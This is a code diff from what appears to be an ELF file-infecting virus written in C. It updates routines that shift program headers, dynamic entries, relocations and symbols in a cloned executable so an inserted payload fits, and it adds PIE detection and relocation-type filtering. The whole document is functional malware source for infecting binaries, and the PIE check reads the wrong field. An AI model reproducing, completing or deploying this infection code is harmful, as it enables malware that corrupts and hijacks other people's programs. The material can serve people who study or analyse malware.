@@ -1,13 +1,21 @@
 #include "virus.h"
 #include "errors.h"
 
-#define is_loadable(type) (type == PT_LOAD)
+#define DF_1_PIE		0x08000000
+
+#define R_X86_64_64		0x01    // direct 64 bit relocation
+#define R_X86_64_RELATIVE	0x08    // adjust by program base
+#define R_X86_64_IRELATIVE	0x25    // adjust indirectly by program base
+
+#define is_loadable(type)	(type == PT_LOAD)
+#define is_pie(tag)		(d_tag & DF_1_PIE)
 
 struct data
 {
 	size_t	shift_amount;
 	size_t	payload_offset;
 	size_t	payload_addr;
+	bool	is_pie;
 };
 
 static bool	adjust_header_values(struct safe_ptr clone_ref, size_t payload_offset,
@@ -76,6 +84,10 @@ static bool	adjust_dynamic_values(struct safe_ptr ref, size_t offset, void *data
 	struct data 	*closure = data;
 	size_t		payload_addr = closure->payload_addr;
 	size_t		shift_amount = closure->shift_amount;
+
+	//
+	if (d_tag == DT_FLAGS_1 && is_pie(d_tag))
+		closure->is_pie = true;
 
 	if (d_tag == DT_NULL) goto end;
 
@@ -155,12 +167,14 @@ static bool	adjust_rela_values(struct safe_ptr ref, size_t offset, void *data)
 
 	Elf64_Addr	r_offset = rela->r_offset;
 	int64_t		r_addend = rela->r_addend;
+	uint64_t	r_info   = rela->r_info & (0xffffffff);
 
 	if (r_offset >= payload_addr)
 	{
 		rela->r_offset += shift_amount;
 	}
-	if (r_addend >= payload_offset)
+	if (r_addend >= payload_offset
+	&& (r_info == R_X86_64_64 || r_info == R_X86_64_RELATIVE || r_info == R_X86_64_IRELATIVE))
 	{
 		rela->r_addend += shift_amount;
 	}
@@ -197,19 +211,23 @@ static bool	adjust_shdr_values(struct safe_ptr ref, size_t offset, void *data)
 	}
 	if (sh_type == SHT_DYNSYM)
 	{
-		foreach_shdr_entry(ref, offset, adjust_dynsym_values, closure);
+		if (!foreach_shdr_entry(ref, offset, adjust_dynsym_values, closure))
+			return false;
 	}
 	else if (sh_type == SHT_REL)
 	{
-		foreach_shdr_entry(ref, offset, adjust_rel_values, closure);
+		if (!foreach_shdr_entry(ref, offset, adjust_rel_values, closure))
+			return false;
 	}
 	else if (sh_type == SHT_RELA)
 	{
-		foreach_shdr_entry(ref, offset, adjust_rela_values, closure);
+		if (!foreach_shdr_entry(ref, offset, adjust_rela_values, closure))
+			return false;
 	}
 	else if (sh_type == SHT_DYNAMIC)
 	{
-		foreach_shdr_entry(ref, offset, adjust_dynamic_values, closure);
+		if (!foreach_shdr_entry(ref, offset, adjust_dynamic_values, closure))
+			return false;
 	}
 	return true;
 }
@@ -228,11 +246,15 @@ bool		adjust_references(struct safe_ptr clone_ref,
 	closure.shift_amount   = shift_amount;
 	closure.payload_offset = payload_offset;
 	closure.payload_addr   = payload_addr;
+	closure.is_pie         = false;
 
 	if (!foreach_phdr(clone_ref, adjust_phdr_values, &closure))
 		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
 	if (!foreach_shdr(clone_ref, adjust_shdr_values, &closure))
 		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
+
+	if (closure.is_pie == false)
+		return false;
 
 	return true;
 }
